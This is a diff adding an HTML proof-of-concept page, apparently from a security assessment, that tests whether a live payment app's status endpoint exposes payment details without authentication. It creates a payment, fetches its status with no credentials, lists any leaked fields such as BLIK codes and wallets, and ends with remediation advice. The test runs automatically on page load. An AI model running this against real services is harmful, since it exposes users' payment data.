@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>AUTHZ-VULN-06 Test</title>
+    <style>
+        body {
+            font-family: monospace;
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .section {
+            border: 1px solid #444;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+        .header {
+            background: #2d2d30;
+            padding: 10px;
+            border-left: 4px solid #007acc;
+            margin-bottom: 20px;
+        }
+        .step {
+            background: #252526;
+            padding: 10px;
+            margin: 10px 0;
+            border-left: 4px solid #4ec9b0;
+        }
+        .success { color: #4ec9b0; }
+        .error { color: #f48771; }
+        .warning { color: #dcdcaa; }
+        .info { color: #9cdcfe; }
+        pre {
+            background: #1e1e1e;
+            border: 1px solid #444;
+            padding: 10px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+        }
+        button {
+            background: #007acc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 3px;
+            margin: 10px 5px;
+        }
+        button:hover {
+            background: #005a9e;
+        }
+        button:disabled {
+            background: #555;
+            cursor: not-allowed;
+        }
+        #results {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>AUTHZ-VULN-06: Unauthorized Payment Status Access Test</h1>
+        <p>Tests if GET /api/payments/:id/status allows unauthenticated access to payment details</p>
+    </div>
+
+    <div class="section">
+        <h2>Test Execution</h2>
+        <button id="runTest" onclick="runTest()">▶ Run Test</button>
+        <button onclick="clearResults()">Clear Results</button>
+    </div>
+
+    <div id="results"></div>
+
+    <script>
+        const BASE_URL = "https://solana-blik.vercel.app";
+        let currentPaymentId = null;
+
+        function log(message, type = 'info') {
+            const results = document.getElementById('results');
+            const div = document.createElement('div');
+            div.className = `section ${type}`;
+            div.innerHTML = message;
+            results.appendChild(div);
+            results.scrollTop = results.scrollHeight;
+        }
+
+        function logSection(title) {
+            log(`<h2>${title}</h2>`, 'step');
+        }
+
+        function logRequest(method, url, body = null) {
+            let html = `<strong>${method}</strong> ${url}`;
+            if (body) {
+                html += `<pre>${JSON.stringify(body, null, 2)}</pre>`;
+            }
+            log(html);
+        }
+
+        function logResponse(status, data) {
+            const statusClass = status === 200 ? 'success' : status >= 400 ? 'error' : 'info';
+            const html = `
+                <div class="${statusClass}">Status Code: ${status}</div>
+                <pre>${JSON.stringify(data, null, 2)}</pre>
+            `;
+            log(html);
+        }
+
+        function clearResults() {
+            document.getElementById('results').innerHTML = '';
+        }
+
+        async function step1CreatePayment() {
+            logSection('STEP 1: Create Payment (Legitimate Merchant)');
+
+            const url = `${BASE_URL}/api/payments/create`;
+            const payload = {
+                amount: 5.0,
+                merchantWallet: "11111111111111111111111111111111"
+            };
+
+            logRequest('POST', url, payload);
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                const data = await response.json();
+                logResponse(response.status, data);
+
+                if (response.status === 200 && data.paymentId) {
+                    currentPaymentId = data.paymentId;
+                    log(`<div class="success">✓ Payment created with ID: ${currentPaymentId}</div>`);
+                    return true;
+                } else {
+                    log(`<div class="error">✗ Failed to create payment</div>`);
+                    return false;
+                }
+            } catch (error) {
+                log(`<div class="error">✗ Error: ${error.message}</div>`);
+                return false;
+            }
+        }
+
+        async function step2ExploitUnauthorizedAccess() {
+            logSection('STEP 2: Access Payment Status WITHOUT Authentication (EXPLOIT)');
+            log(`<div class="warning">⚠ Scenario: Attacker (different actor) tries to access payment details</div>`);
+            log(`<div class="warning">⚠ Expected if vulnerable: 200 status with payment details exposed</div>`);
+
+            const url = `${BASE_URL}/api/payments/${currentPaymentId}/status`;
+
+            logRequest('GET', url);
+            log(`<div class="warning">⚠ Note: NO authentication headers provided (simulating attacker)</div>`);
+
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                logResponse(response.status, data);
+
+                // Analyze the response
+                logSection('VULNERABILITY ANALYSIS');
+
+                if (response.status === 200) {
+                    log(`<div class="error"><h3>🚨 CRITICAL: Vulnerability CONFIRMED!</h3></div>`);
+                    log(`<div class="error">The endpoint returned 200 OK without authentication</div>`);
+
+                    let disclosedFields = [];
+                    let sensitiveInfo = '<strong>Sensitive Information Disclosed:</strong><br>';
+
+                    if (data.status !== undefined) {
+                        sensitiveInfo += `<br>• Payment Status: ${data.status}`;
+                        disclosedFields.push('status');
+                    }
+                    if (data.amount !== undefined) {
+                        sensitiveInfo += `<br>• Payment Amount: ${data.amount}`;
+                        disclosedFields.push('amount');
+                    }
+                    if (data.code !== undefined) {
+                        sensitiveInfo += `<br>• BLIK Code: ${data.code}`;
+                        disclosedFields.push('code');
+                    }
+                    if (data.reference !== undefined) {
+                        sensitiveInfo += `<br>• Reference: ${data.reference}`;
+                        disclosedFields.push('reference');
+                    }
+                    if (data.merchantWallet !== undefined) {
+                        sensitiveInfo += `<br>• Merchant Wallet: ${data.merchantWallet}`;
+                        disclosedFields.push('merchantWallet');
+                    }
+                    if (data.customerWallet !== undefined) {
+                        sensitiveInfo += `<br>• Customer Wallet: ${data.customerWallet}`;
+                        disclosedFields.push('customerWallet');
+                    }
+                    if (data.createdAt !== undefined) {
+                        sensitiveInfo += `<br>• Created At: ${data.createdAt}`;
+                        disclosedFields.push('createdAt');
+                    }
+
+                    sensitiveInfo += `<br><br>Total disclosed fields: ${disclosedFields.length}`;
+                    sensitiveInfo += `<br>Fields: ${disclosedFields.join(', ')}`;
+
+                    log(`<div class="error">${sensitiveInfo}</div>`);
+
+                    log(`<div class="error">
+                        <h3>IMPACT: Information Disclosure Vulnerability</h3>
+                        • Any unauthenticated user can access payment details<br>
+                        • Only requires knowledge of the payment UUID<br>
+                        • Exposes merchant business information (amounts, status)<br>
+                        • Could expose BLIK codes if still active<br>
+                        • Violates payment confidentiality
+                    </div>`);
+
+                    return true;
+
+                } else if (response.status === 401) {
+                    log(`<div class="success">✓ Vulnerability NOT present</div>`);
+                    log(`<div class="success">Endpoint correctly requires authentication (401 Unauthorized)</div>`);
+                    return false;
+
+                } else if (response.status === 403) {
+                    log(`<div class="success">✓ Vulnerability NOT present</div>`);
+                    log(`<div class="success">Endpoint correctly denies access (403 Forbidden)</div>`);
+                    return false;
+
+                } else {
+                    log(`<div class="warning">⚠ Unexpected status code: ${response.status}</div>`);
+                    return false;
+                }
+
+            } catch (error) {
+                log(`<div class="error">✗ Error: ${error.message}</div>`);
+                return false;
+            }
+        }
+
+        async function runTest() {
+            const button = document.getElementById('runTest');
+            button.disabled = true;
+            clearResults();
+
+            log(`<div class="header">
+                <strong>Starting AUTHZ-VULN-06 Test</strong><br>
+                Test Time: ${new Date().toISOString()}<br>
+                Target: ${BASE_URL}
+            </div>`);
+
+            const step1Success = await step1CreatePayment();
+            if (!step1Success) {
+                log(`<div class="error">✗ Test failed at Step 1</div>`);
+                button.disabled = false;
+                return;
+            }
+
+            await new Promise(resolve => setTimeout(resolve, 500));
+
+            const vulnerable = await step2ExploitUnauthorizedAccess();
+
+            logSection('TEST SUMMARY');
+            log(`<div class="${vulnerable ? 'error' : 'success'}">
+                <strong>Test:</strong> AUTHZ-VULN-06<br>
+                <strong>Vulnerability:</strong> Unauthorized Payment Status Access<br>
+                <strong>Result:</strong> ${vulnerable ? '🚨 VULNERABLE' : '✓ NOT VULNERABLE'}
+            </div>`);
+
+            if (vulnerable) {
+                log(`<div class="warning">
+                    <h3>RECOMMENDATION</h3>
+                    • Add authentication and authorization checks to /api/payments/:id/status<br>
+                    • Verify the requester has permission to view the specific payment<br>
+                    • Implement proper access control based on merchant/customer ownership
+                </div>`);
+            }
+
+            button.disabled = false;
+        }
+
+        // Auto-run on page load after 1 second
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                console.log('Auto-running test...');
+                runTest();
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
